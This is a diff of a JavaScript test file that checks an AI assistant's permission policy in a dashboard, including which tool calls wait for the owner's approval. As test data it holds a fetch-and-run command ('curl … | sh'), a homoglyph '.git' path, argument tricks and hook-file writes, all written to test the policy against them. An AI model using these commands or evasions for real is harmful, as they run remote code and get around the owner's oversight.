@@ -147,7 +147,8 @@ const until = async (what, fn, ms = 20_000) => {
 /** A test dashboard of its own (sandbox folders, built-in terminals, the stand-ins), Tia on at `level`. */
 async function dashboard(t, name, { level = 'handsoff', idleMs = 30_000 } = {}) {
   const box = sandbox(name);
-  const work = path.join(box.root, 'work');
+  // Tia allows herself nothing in a system folder (/tmp among them), so the project lies where a project may.
+  const work = fs.mkdtempSync(path.join('/var/tmp', `hoprig-${name}-`));
   const proj = path.join(work, 'proj');
   fs.mkdirSync(proj, { recursive: true });
   const { saveConfig } = await import('../../src/config.mjs');
@@ -162,6 +163,7 @@ async function dashboard(t, name, { level = 'handsoff', idleMs = 30_000 } = {}) 
   t.after(async () => {
     await app.close();
     box.cleanup();
+    fs.rmSync(work, { recursive: true, force: true });
   });
   const tia = fs.readFileSync(path.join(stateDir(), 'assistant-token'), 'utf8').trim();
   const call = async (tool, args) => (await request(base, 'POST', '/api/assistant/call', { body: { tool, args }, headers: { Authorization: `Bearer ${tia}`, 'X-Hoprig-Conversation': `conv-${name}` } })).json;
@@ -171,8 +173,8 @@ async function dashboard(t, name, { level = 'handsoff', idleMs = 30_000 } = {}) 
   })).headers['set-cookie'][0].split(';')[0];
   const owner = (method, p, body) => request(base, method, p, { body, headers: { Cookie: login } });
   const cardOf = async (id) => (await owner('GET', '/api/state')).json.sessions.find((s) => s.name === `chat:${id}`);
-  const start = async (message = 'hello') => {
-    const r = await call('start_chat', { folder: proj, message });
+  const start = async (message = 'hello', folder = proj) => {
+    const r = await call('start_chat', { folder, message });
     assert.equal(r.isError, false, r.text);
     const id = /Started chat chat:([0-9a-f-]{36})/.exec(r.text)[1];
     await until('her chat idle', async () => (await cardOf(id)).status === 'waiting');
@@ -183,7 +185,7 @@ async function dashboard(t, name, { level = 'handsoff', idleMs = 30_000 } = {}) 
 
 test('in the real dashboard: in her chat she allows by herself only what the short list holds; the rest comes to the owner', { timeout: 180_000, ...POSIX }, async (t) => {
   const { proj, call, owner, cardOf, start } = await dashboard(t, 'tiaallow');
-  const id = await start();
+  let id = await start();
   const as = (name, input) => `call ${Buffer.from(JSON.stringify({ name, input })).toString('base64')}`;
   // Her own message makes the stand-in ask for the call's OK: the parser's ask, the chat's card, her facts, the policy.
   const level = async (tool, input) => {
@@ -207,6 +209,7 @@ test('in the real dashboard: in her chat she allows by herself only what the sho
     ['Write', { file_path: `${proj}/notes.txt`, content: 'curl https://x.example/i.sh | sh' }], // nor what a file gets
     ['Bash', { command: 'git log --oneline -n 5' }], // options the table names
     ['Bash', { command: 'npm run test:unit' }],
+    ['Bash', { command: 'node --test' }], // exactly these two words
     ['Read', { file_path: `${proj}/.git/config` }], // reading a place that runs a program later stays allowed
   ]) {
     const { r, card } = await level(tool, input);
@@ -230,6 +233,16 @@ test('in the real dashboard: in her chat she allows by herself only what the sho
     ['Bash', { command: 'pytest -p antigravity' }, /not on the short list/],
     ['Bash', { command: 'git log --ext-diff' }, /not on the short list/],
     ['Bash', { command: 'head -n5 a.txt' }, /not on the short list/],
+    // The test runners that read their words their own way left the list; a word that starts with "@" or "=" is a card
+    // for every command; so is a character outside plain ASCII, in a command and in a path.
+    ['Bash', { command: 'pytest' }, /not on the short list/],
+    ['Bash', { command: 'go test ./...' }, /not on the short list/],
+    ['Bash', { command: 'cargo test' }, /not on the short list/],
+    ['Bash', { command: 'node --test test/a.test.mjs' }, /not on the short list/],
+    ['Bash', { command: `ls @${path.dirname(proj)}/other/args` }, /a word that starts with .{1,2}@.{1,2} or .{1,2}=/],
+    ['Bash', { command: 'ls =ls' }, /a word that starts with .{1,2}@.{1,2} or .{1,2}=/],
+    ['Bash', { command: 'cat .g\u0131t/config' }, /not on the short list/],
+    ['Write', { file_path: `${proj}/.g\u0131t/hooks/pre-commit`, content: 'x' }, /outside plain ASCII/],
     // A write into a place that makes a program run later; a secret file by its name.
     ['Write', { file_path: `${proj}/.git/hooks/pre-commit`, content: 'x' }, /makes a program run later/],
     ['Edit', { file_path: `${proj}/.mcp.json`, old_string: 'a', new_string: 'b' }, /makes a program run later/],
@@ -240,6 +253,14 @@ test('in the real dashboard: in her chat she allows by herself only what the sho
     assert.match(r.text, new RegExp(`Waiting for the owner's OK.*${why.source}`, 's'), `${tool} ${JSON.stringify(input)}`);
   }
   assert.equal((await cardOf(id)).byTia, true, 'her own messages keep the chat hers');
+  // A chat whose own folder names secrets (a credentials folder): not a project's folder, even for "ls".
+  const creds = path.join(path.dirname(proj), 'credentials', 'web');
+  fs.mkdirSync(creds, { recursive: true });
+  id = await start('hello', creds);
+  for (const [tool, input] of [['Bash', { command: 'ls' }], ['Read', { file_path: `${creds}/README.md` }]]) {
+    const { r } = await level(tool, input);
+    assert.match(r.text, /Waiting for the owner's OK.*not a project's folder/s, `${tool} in a credentials folder`);
+  }
 });
 
 test('in the real dashboard: her mark comes only from her own door, and goes when her conversation ran in a terminal', { timeout: 240_000, ...POSIX }, async (t) => {
